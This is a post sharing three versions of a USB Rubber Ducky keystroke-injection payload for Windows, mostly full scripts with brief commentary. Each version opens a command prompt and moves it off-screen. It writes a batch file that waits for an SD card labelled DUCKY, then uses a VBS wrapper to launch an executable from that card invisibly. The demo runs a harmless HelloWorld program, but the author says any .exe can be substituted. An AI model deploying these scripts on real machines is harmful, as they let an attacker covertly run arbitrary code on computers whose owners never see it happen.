The following is a payload I have been working on that waits until a drive labeled "DUCKY" is mounted. I have used some of midnightsnake's code in this payload. The name of the file that is run can be changed to .exe, I am just having it run a batch for testing purposes. The line that says "STRING START %myd%\myEXE.bat" is the line that executes the executable.

```
REM Author: overwraith
REM Name: RunEXE.txt
REM Purpose: Run an executable file off of the SD card after it mounts. 
REM Encoder V2.4
REM Using the run command for a broader OS base. 
DEFAULT_DELAY 25
DELAY 3000
GUI r
DELAY 1000
STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
DELAY 500
ENTER
DELAY 750
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER

REM Change directories because System32 appears to be protected. 
STRING CD %TEMP%
ENTER

REM Make batch file that waits for SD card to mount. 
REM Delete batch file if already exists
STRING erase /Q DuckyWait.bat
ENTER
STRING copy con DuckyWait.bat
ENTER
REM DuckyWait.bat
STRING :while1
ENTER
STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set myd=%%d
ENTER
STRING if Exist %myd% (
ENTER
STRING goto :break
ENTER
STRING )
ENTER
STRING timeout /t 30
ENTER
STRING goto :while1
ENTER
STRING :break
ENTER
REM Continue script.
STRING START %myd%\HelloWorld.exe
ENTER
CONTROL z
ENTER

REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
REM Delete vbs file if already exists
STRING erase /Q invis.vbs
ENTER
REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
STRING copy con invis.vbs
ENTER
STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
ENTER
CONTROL Z
ENTER

REM RUN THE BATCH FILE
STRING wscript.exe invis.vbs DuckyWait.bat
ENTER
STRING EXIT
ENTER
```

The following is the batch file that is run after the "DUCKY" drive has been mounted. Everything is being run invisibly, so you will need to check for the existence of "Message.txt" which will probably be in "C:\Windows\system32".

```
REM Message.txt
echo Hello Wolrd!!!
echo Hello World!!! > Message.txt
```

The encoders now support the repeat command, so should only be a problem if you are using an old encoder. Encoders also now support white space in the duck script, so functions have been separated with white space. 

The following is a newer version of the RunEXE from SD payload which uses googleknowsbest's method for finding the "DUCKY" drive, which is more portable than the previous version's method. This version should work on all current Windows versions. Ex... XP, Vista, and Windows 7. 

```
REM Author: overwraith
REM Name: RunEXE_V2.txt
REM Purpose: Run an executable file off of the SD card after it mounts. Uses googleknowsbest's slightly more portable method to find the "Ducky" drive. 
REM Encoder V2.4
REM Using the run command for a broader OS base. 
DEFAULT_DELAY 75
DELAY 3000
GUI r
DELAY 1000
STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
DELAY 500
ENTER
DELAY 750
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER

REM Change directories because System32 appears to be protected. 
STRING CD %TEMP%
ENTER

REM Make batch file that waits for SD card to mount. 
REM Delete batch file if already exists
STRING erase /Q DuckyWait.bat
ENTER
STRING copy con DuckyWait.bat
ENTER
REM DuckyWait.bat
STRING :while1
ENTER
STRING for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%%A:)
ENTER
STRING if Exist %DUCKYdrive% (
ENTER
STRING goto :break
ENTER
STRING )
ENTER
STRING timeout /t 30
ENTER
STRING goto :while1
ENTER
STRING :break
ENTER
REM Continue script.
STRING START %DUCKYdrive%\HelloWorld.exe
ENTER
CONTROL z
ENTER

REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
REM Delete vbs file if already exists
STRING erase /Q invis.vbs
ENTER
REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
STRING copy con invis.vbs
ENTER
STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
ENTER
CONTROL Z
ENTER

REM RUN THE BATCH FILE
STRING wscript.exe invis.vbs DuckyWait.bat
ENTER
REM STRING EXIT
REM ENTER
```
The following is another take on the RunEXE from SD payload, I think the micro SD connection is faster than it used to be, it could just be me. Here I am using a special for loop which uses the 'Vol' command for volume information. I am pretty sure it runs on most Windows boxes, and am reasonably sure it runs on most old computers. The main reason for the revamp is to eliminate some of the problems associated with the 'diskpart' command, which if run on a non admin box will cause previous scripts to essentially hang. 

```
REM Author: overwraith
REM Name: RunEXE_V3.txt
REM Purpose: Run an executable file off of the SD card after it mounts. Uses a slightly different verison of the drive finder code. 
REM Encoder V2.4+
REM Using the run command for a broader OS base. 
DEFAULT_DELAY 75
DELAY 3000
GUI R
DELAY 1000
STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
DELAY 500
ENTER
DELAY 750
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER

REM Change directories because System32 appears to be protected. 
STRING CD %TEMP%
ENTER

REM Make batch file that waits for SD card to mount. 
REM Delete batch file if already exists
STRING erase /Q DuckyWait.bat
ENTER
STRING copy con DuckyWait.bat
ENTER
REM DuckyWait.bat
STRING :while1
ENTER
STRING for %%d in (A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z) do ( 
ENTER
STRING for /f "tokens=6 delims= " %%i in ('Vol %%d:') do (
ENTER
STRING if "%%i" EQU "DUCKY" ( set "DuckyDrive=%%d:" )
ENTER
STRING )
ENTER
STRING )
ENTER
STRING if Exist %DuckyDrive% (
ENTER
STRING goto :break
ENTER
STRING )
ENTER
STRING timeout /t 30
ENTER
STRING goto :while1
ENTER
STRING :break
ENTER
REM Continue script.
STRING START %DuckyDrive%\HelloWorld.exe
ENTER
CONTROL z
ENTER

REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
REM Delete vbs file if already exists
STRING erase /Q invis.vbs
ENTER
REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
STRING copy con invis.vbs
ENTER
STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
ENTER
CONTROL Z
ENTER

REM RUN THE BATCH FILE
STRING wscript.exe invis.vbs DuckyWait.bat
ENTER
STRING EXIT
ENTER
```